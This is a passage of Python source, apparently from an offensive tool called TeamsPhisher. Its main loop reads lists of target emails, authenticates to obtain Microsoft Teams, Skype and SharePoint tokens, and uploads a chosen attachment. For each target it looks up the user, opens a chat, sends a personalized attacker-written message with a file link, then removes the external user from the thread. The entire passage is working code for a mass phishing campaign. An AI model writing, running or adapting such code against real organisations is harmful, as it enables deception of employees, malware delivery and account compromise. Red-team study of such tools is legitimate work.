        mode = Fore.BLUE + "\nPreview mode: " + Style.RESET_ALL + "Sending test message to sender's account and showing target's friendly names for use with personalized greetings"
    else:
        mode = Fore.BLUE + "\nOperational mode: " + Style.RESET_ALL + "Sending phishing messages to targets!"

    print(mode)
    if args.log:
        p_file(mode, False)

    # Fancy countdown timer to allow operators to review options and abort if necessary
    print("")
    for i in range(5,-1,-1):
        time.sleep(1)
        if i < 10:
            stri = "0" + str(i)
        else:
            stri = str(i)
        print(Fore.RED + "Time left to abort: " + Style.RESET_ALL + stri, end="\r", flush=True)

    p_info("\n\nAuthenticating, verifying files, and uploading attachment\n")

    # Vars to track number of targets/status
    numTargets = 0
    numFailed = 0
    numSent = 0

    # Populate list of emails
    targets = []
    if args.email:
        targets = [args.email]
        numTargets = 1
    elif args.csvlist:
        p_task("Reading target csv list...")
        try:
            with open(args.csvlist) as f:
                targetsReader = DictReader(f,delimiter=',')
                if not all(field in targetsReader.fieldnames for field in ['url','email']):
                    raise KeyError("Could not read header row values 'url' and 'email' from csvlist")
                targets = list(targetsReader)
                numTargets = len(targets)
            f.close()
            p_success("SUCCESS!")
        except Exception as e:
            p_err("Could not read supplied list of emails!\nError: %s" % e, True)
    else:
        p_task("Reading target email list...")
        try:
            with open(args.list) as f:
                targets = f.read().splitlines()
            f.close()
            numTargets = len(targets)
            p_success("SUCCESS!")
        except:
            p_err("Could not read supplied list of emails!", True)

    # Check to make sure attachment file exists
    if args.attachment:
        if not os.path.isfile(args.attachment):
            p_err("Cannot locate %s!" % (args.attachment), True)

    # Check to make sure message file exists
    if not os.path.isfile(args.message):
        p_err("Cannot locate %s!" % (args.message), True)

    # Authenticate and fetch our tokens and sender info
    bToken, skypeToken, storageToken, teamsgroupssvcToken, senderInfo, senderUsers = authenticate(args)

    uploadId = uploadInfo = senderSharepointURL = senderDrive = None
    if args.attachment:
        # Assemble Sharepoint name + Senders drive for later use
        # If user-specified sharepoint was provided, assemble using that value otherwise do so using senderInfo
        senderDrive = args.username.replace("@", "_").replace(".", "_").lower()
        if args.sharepoint:
            senderSharepointURL = "https://%s-my.sharepoint.com" % (args.sharepoint)
        elif args.msa:
            senderSharepointURL = senderDrive = None
        else:
            senderSharepointURL = "https://%s-my.sharepoint.com" % senderInfo.get('tenantName')

        # Upload file to sharepoint/onedrive that will be sent as an attachment in chats
        uploadInfo = uploadFile(storageToken, args.attachment, senderSharepointURL, senderDrive)
        if args.msa:
            uploadId = uploadInfo.get('id')
        else:
            uploadId = uploadInfo.get('sharepointIds').get('listItemUniqueId')

        # Hash file and output for logging/tracking purposes
        p_info("\nHashing file\n")
        hashFile(args.attachment)

    # If preview mode, we are sending the phishing message to our own account so we can review it.
    # To facilitiate this, 'senderInfo' is passed to getInviteLink for both the sender and the target info fields within the function
    # Additionally, threadID is set to None as we are not creating a new chat thread here and this signals sendFile to use our sender's 'notes' thread as the URL.
    if args.preview:
        p_info("\nSending test message to %s\n" % args.username) 
        p_task("%s" % (args.username))

        # Retrieve an invite link for the uploaded file
        inviteInfo = (None if not args.attachment else getInviteLink(storageToken, uploadId, senderDrive, senderSharepointURL, senderInfo, senderInfo, args.securelink))
        threadID = None
        
        # Send attacker-defined message to ourselves for review
        success = sendMessage(skypeToken, threadID, senderInfo, senderInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting, args.msa, args.url, args.displayname)

        p_info("\nPreviewing customized names identified by TeamsPhisher\n")
    else:
        p_info("\nSending messages to users!\n")

    ## LOOP THROUGH USERS ##
    for target in targets:
        targetUrl = None
        if type(target) == dict:
            targetUrl = target['url']
            target = target['email']
        elif args.url:
            targetUrl = args.url
        p_task("%s" % (target))

        if "@" not in target:
            p_warn("Invalid target specified. Skipping")
            numFailed += 1
            continue

        # If a delay was specified, sleep now.
        if(args.delay):
            time.sleep(args.delay)

        # Enumerate target user info
        if args.msa:
            targetInfo = enumUser(bToken, target, skypeToken)
        else:
            targetInfo = enumUser(bToken, target)
        
        if targetInfo:

            # If preview switch was used, resolve friendly name for each target and print for viewing.
            if args.preview:
                friendlyName = findFriendlyName(targetInfo)

                if friendlyName:
                    p_success("Friendly Name: %s" % (friendlyName))
                else:
                    p_warn("Could not resolve a friendly name!")

            # Real mode. Creating chats and sending messages!
            else:

                # Create new chat thread with target user
                threadID = createThread(skypeToken, senderInfo, targetInfo, teamsgroupssvcToken)
                

                if threadID:
                    # Retrieve an invite link for the uploaded file
                    inviteInfo = (None if not args.attachment else getInviteLink(storageToken, uploadId, senderDrive, senderSharepointURL, senderInfo, targetInfo, args.securelink))
                    if inviteInfo is None and args.attachment:
                        numFailed += 1
                        continue
                    else:
                        # Send attacker-defined message to target with file sharing URL
                        if not sendMessage(skypeToken, threadID, senderInfo, targetInfo, inviteInfo, senderSharepointURL, senderDrive, args.attachment, args.message, args.personalize, args.nogreeting, args.msa, targetUrl, args.displayname):
                            numFailed += 1
                            continue
                        removeExternalUser(skypeToken, senderInfo, threadID, targetInfo, args.msa)
                        numSent += 1
                else:
                    numFailed += 1
                    continue
        
        else:
            numFailed += 1
# Print report
    if not args.preview:
        p_info("\nReport:\n")
        p_task("Successes")
        p_success(str(numSent))
        if numFailed:
            p_task("Failures")
            p_err(str(numFailed), False)
        p_task("Total")
        p_info("[~] " + str(numTargets))
        p_info("\n")
